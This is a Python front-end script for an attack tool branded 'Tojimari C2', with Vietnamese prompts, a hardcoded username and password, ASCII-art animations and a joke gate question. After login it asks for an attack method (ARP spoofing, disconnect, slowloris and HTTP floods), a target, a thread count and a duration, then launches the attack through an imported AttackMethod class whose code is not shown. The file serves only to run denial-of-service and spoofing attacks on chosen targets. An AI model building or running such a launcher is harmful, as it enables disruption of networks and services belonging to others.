# -*- coding: utf-8 -*-
import os
import sys
import getpass
import time

from colorama import Fore, Style

os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.addons.checks import (check_http_target_input,
                                     check_local_target_input,
                                     check_method_input, check_number_input)
    from tools.addons.ip_tools import show_local_host_ips
    from tools.addons.logo import show_logo
    from tools.method import AttackMethod
except (ImportError, NameError) as err:
    print(f"\nFailed to import something: {err}")
    sys.exit(1)

correct_username = "Tojimari"
correct_password = "H3C"

def login() -> bool:
    print("⚡ Username: ", end="", flush=True)
    username = input()
    
    print("⚡ Password: ", end="", flush=True)
    password = getpass.getpass("")
    
    if username == correct_username and password == correct_password:
        return True
    else:
        return False

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def show_welcome_message():
    print(f"{Fore.GREEN}[ Tojimari ] | Chào Mừng Đến Với Tojimari C2! | Owner: Tojimari | Update v1.1 |{Fore.RESET}\n")

def ascii_vro():
    clear_screen()
    print(f'''      
             
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  
    ''')
    time.sleep(0.6)
    clear_screen()
    print(f'''
          
          

     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  
    ''')
    time.sleep(0.6)
    clear_screen()
    print(f'''
          



     / **/|        
     | == /        
      |  |         
 
          
    ''')
    time.sleep(0.6)
    clear_screen()
    print(f""" 
          
     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \\._                   _./  
    
--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____ {Fore.RESET}
    """)
    time.sleep(2)  # Thêm thời gian để vụ nổ hiển thị lâu hơn

def show_image():
    # Hiển thị hình ảnh ASCII hoặc hình ảnh văn bản của bạn ở đây
    clear_screen()
    print(f'''
:::::::::::::::::::...................................................................::::
:::::::::::::::::::.................................................................::::::
:::::::::::::::::::.................................................................::::::
:::::::::::::::::::::............................................................:::::::::
:::::::::::::::::::::::::::.........:::::::::..::::...............................::::::::
::::::::::::::::::::::::::::.....::::----:--====++*+-:::::..............:::..:::::::::::::
:::::::::::::::::::::::::::::::::-=*##********#*#%%%#****++-::...:.....:::::..::::::::::::
:::::::::::::::::::::::::::::::-*#%%%%%%%%%%%%%%%%%%%%%%%%%%#=::.:.::::::::::.:.::::::::::
::::::::::::::::::::::::::::::+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*::::::::::::.:.::::::::::::
:::::::::::::::::::::::::::::*%%%%%%%%%%%###%%%%%%%%%%%%%%%%%%%+:::.::::::::::::::::::::::
::::::::::::::::::::::::::::+%%%%%%%%%%%##*######%%%%%%%%%%%%%%#-:::::::::::.:::::::::::::
:::::::::::::::::::::::::::-#%%%%%%%%%###**#**#*##%#%%%%%%%%%%%%*:::::::::::::::::::::::::
:::::::::::::::::::::::::::-%%%%%%%%####****+*#**##*###%%%%%%%%%#-::::::::::::::::::::::::
:::::::::::::::::::::::::::+%%%%%%%%#*******+*#*+******###%#%%%%#+::::::::::::::::::::::::
:::::::::::::::::::::::::::+%%%%%%###***#**+*#**++=+#*+*#%%%%#%#%#::::::::::::::::::::::::
:::::::::::::::::::::::::::+%%%%%###*********+==--=+****#%%%%%%%%#::::::::::::::::::::::::
:::::::::::::::::::::::::::=%%%%##**+++++==++=----===-==-=#%%%%%%*::::::::::::::::::::::::
:::::::::::::::::::::::::::=#%%%**++**+#*=+=+=::--=+#*===--+#%%%#+::::::::::::::::::::::::
:::::::::::::::::::::::::::*%#%#**+=====---=+=::---------:---#%%#=::::::::::::::::::::::::
:::::::::::::::::::::::::::#%%%#*++=------=++-:::::::::::::--#%#%#::::::::::::::::::::::::
:::::::::::::::::::::::::::*%%%#**+=------=+=-:::::::::::::--#%%%#::::::::::::::::::::::::
::::::::::::::::::::::::::::*%%#**+==----+++=-:::::::::::::-+%%%#-::::::::::::::::::::::::
:::::::::::::::::::::::::::::---+*++==---==++=--=-::::::::--+##+-:::::::::::::::::::::::::
::::::::::::::::::::::::::::::::-**++==--====---::::::::::--::=:::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::+**++====+++=----:::::::--:::-:::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::+**++==***++=====-::::--:::=::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::+***++==+++==----:::---:::--::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::*****++=------::::----::::=:::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::-*******+=----::::-----:::--:::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::-=**++**#*++==----------:::=::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::+=--++=++**+=-----------.:+-=::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::=*#=-::-===+++=---------:...+#*=-::::::::::::::::::::::::::::
::::::::::::::::::::::::::-+##%#=--:::--=====---==-.....:####***+=-:::::::::::::::::::::::
::::::::::::::::::::-==+**#%%%%*=--:::.:-=====+=:.......=####********++=--::::::::::::::::
::::::::::::::--=+*#######%%%%%*=--:::...:=+*=:.........*######****######**+=---::::::::::
::::::::-==+**###%%###%%%%%%%%%+---::::=*%%%%%*-.......=################%####**++++==:::::
::::-=+**####%%%%%%%%%%%%%%%%%%+----:=%%%%%%%%%%#-.....+################%%%%%#####*#**-:::
:::-###%%%%%%%%%%%%%%%%%%%%%%%%+---:-+#%%%%%%%%%#=-....*###################%%#########*-::
:::#%%%%%%%%%%%%%%%%%%%%%%%%%%%+::.::-=#%%%%%%%=:::::..*%###################%######%####-:
::+%%%%%%%%%%%%%%%%%%%%%%%%%%%%+-...:-=+#%%%%%-:.....::#%##########################%####*:
::#%%%%%%%%%%%%%%%%%%%%%%%%%%%#+-..::-=+#%%%%%-:....:.=#%################################+
:=%%%%%%%%%%%%%%%%%%%%%%%%%%%%#*:..:--=#%%%%%%%+:....:+*%#################################
-#%%%%%%%%%%%%%%%%%%%%%%%%%%%%#+..::-=+%%%%@%%%%+:.:.==*%#################################
-%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#+.::--=#%%%%@%%%%%-::--=#%#########################%#######
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*:::-=+%%%%%%%%%%%*::=:=#%########################%########
  
  
    
    ''')
    time.sleep(2)  # Thay đổi thời gian hiển thị hình ảnh tùy theo nhu cầu

def ask_question():
    clear_screen()
    print("Quốc Đạt có đẹp trai không?")
    answer = input("Câu trả lời của bạn: ")
    
    if answer.strip().lower() == "quá đẹp":
        return True
    else:
        return False

def show_menu():
    print(f"{Fore.GREEN}[ Tojimari ] | Chào Mừng Đến Với Tojimari C2! | Owner: Tojimari | Update v1.1 |{Fore.RESET}\n")
    show_logo()  # Assuming show_logo displays the menu

def main() -> None:
    if not login():
        print(f"\n{Fore.RED}[!] {Fore.MAGENTA}Login failed. Incorrect username or password.\n\n{Fore.RESET}")
        sys.exit(1)
    
    ascii_vro()

    if not ask_question():
        print(f"\n{Fore.RED}[!] {Fore.MAGENTA}Câu trả lời không chính xác. Chương trình sẽ đóng lại.\n\n{Fore.RESET}")
        sys.exit(1)

    show_image()  # Hiển thị hình ảnh sau khi trả lời đúng câu hỏi
    clear_screen()
    show_menu()
    input("Nhấn Enter để tiếp tục...")
    
    clear_screen()

    try:
        show_menu()  # Show menu again after clearing the screen
        method = check_method_input()
        if method in ["arp-spoof", "disconnect"]:
            show_local_host_ips()

        if method == "arp-spoof":
            target = check_local_target_input()
        else:
            target = check_http_target_input()

        threads = check_number_input("threads") if method not in ["arp-spoof", "disconnect"] else 1
        time = check_number_input("time")
        sleep_time = check_number_input("sleep time") if "slowloris" in method else 0

        with AttackMethod(
            duration=time,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
        ) as attack:
            attack.start()

    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error occurred: {e}\n{Fore.RESET}")
        sys.exit(1)

if __name__ == "__main__":
    main()
